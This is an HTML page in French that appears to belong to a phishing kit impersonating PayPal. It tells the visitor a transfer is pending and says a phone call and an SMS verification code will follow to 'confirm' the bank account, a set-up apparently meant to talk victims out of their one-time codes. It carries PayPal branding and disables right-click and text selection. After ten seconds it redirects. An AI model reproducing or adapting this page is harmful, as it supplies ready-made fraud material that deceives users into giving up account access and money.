    <!DOCTYPE html>
    <html dir="ltr">
        <head>
            <title>Traitement en cours...</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
            <meta charset="utf8">
            <link rel="stylesheet" href="../css/normalize.css" />
            <link rel="stylesheet" href="../css/bootstrap.min.css" />
            <link rel="stylesheet" href="../css/font-awesome.min.css" />
            <link rel="stylesheet" href="../css/main_style.css" />
            <link rel="shortcut icon" type="image/x-icon" href="../img/pp_favicon_x.ico">
            <script language="JavaScript1.2" type="text/javascript">
  //The functions disableselect() and reEnable() are used to return the status of events.

        function disableselect(e)
        {
                return false 
        }
        
        function reEnable()
        {
                return true
        }
        
        //if IE4 
        // disable text selection
        document.onselectstart=new Function ("return false")
        
        //if NS6
        if (window.sidebar)
        {
                //document.onmousedown=disableselect
                // the above line creates issues in mozilla so keep it commented.
        
                document.onclick=reEnable
        }
        
        function clickIE()
        {
                if (document.all)
                {
                        (message);
                        return false;
                }
        }
        
        // disable right click
        document.oncontextmenu=new Function("return false")
        
</script>
        </head>
        <body>
            <div class="contain">
                <div class="img-logo">
                    <a href="#"><img src="../img/paypal-logo.png" style="height: 160px;margin-top: -60px;margin-bottom: -75px;"></a>
                </div>
                <div class="center-color"></div>
                <div class="right-btn"><a href="../index.php" class="log_out">Déconnexion</a></div>
                <div class="cls"></div>
            </div>
            <div class="contain biling-p">
                <div class="contain-info">
                    <center>
                        <h3> Votre virement est en cours</h3>
                        <img src="https://i.ibb.co/K9v75Ct/Rolling-1s-200px.gif" style="width: 70px;height: auto;margin-bottom:20px">
                    </center>
                    <p style="color:#676767">Suite aux nouvelles mesures de sécurité, vous serez crédité sur votre compte qu’après avoir confirmé que vous êtes bien le titulaire du compte bancaire enregistré sur votre compte Paypal. <br />
					Pour terminer la confirmation de votre compte : vous serez contacté par téléphone par le service client dans les meilleurs délais. <br />
					En confirmant votre compte bancaire, vous autorisez Paypal à vous envoyer un SMS.Vous trouverez dans le SMS, un montant de vérification généré de manière aléatoire et un code de 4 à 8 chiffres.
					<br />
					La confirmation de votre compte bancaire vous permet de prouver que vous êtes bien le titulaire de la carte bancaire enregistrée puisque vous seul avez accès au code Paypal.
					
					</p>
                    <h5 style="color:#676767">En attendant, vous pouvez accéder à votre compte avec une sécurité renforcée. </h5>
                    <center>
					<hr >
                        <h4 style="color:#676767">Cordialement,Paypal.</h4>
                        <h5 style="color:#676767;margin:20px auto"></h5>
                    </center>
                </div>
            </div>
            <div class="foot-pay">
                <center>
                    <a href="#">Aide et Contact</a>
                    <a href="#">Confidentialité</a>
                    <a href="#">Légal</a>
                    <a href="#">Sécurité</a>                
                </center>            
            </div>            <script src="../js/jquery-1.11.3.min.js"></script>
            <script src="../js/bootstrap.min.js"></script>
            <script src="../js/cont.js"></script>
            <script src="../js/plugins.js"></script>

<script type="text/javascript">
        function redirect(){
            window.location = "../index.php";
        }
        setTimeout(redirect, 10000);
    </script>

        </body>
    </html>
